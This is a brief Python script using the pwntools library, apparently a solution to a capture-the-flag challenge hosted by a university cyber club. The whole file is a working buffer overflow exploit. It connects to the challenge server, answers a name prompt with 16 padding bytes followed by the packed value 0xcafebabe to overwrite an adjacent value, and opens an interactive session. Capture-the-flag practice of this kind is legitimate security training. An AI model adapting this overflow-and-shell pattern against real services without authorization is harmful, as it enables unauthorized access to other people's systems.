from pwn import *

host = 'pwn.osucyber.club'
port = 13373

p = remote(host, port)
p.recvuntil('Enter your name:\n')
payload = 'A' * 16 + p32(0xcafebabe)
p.sendline(payload)
p.interactive()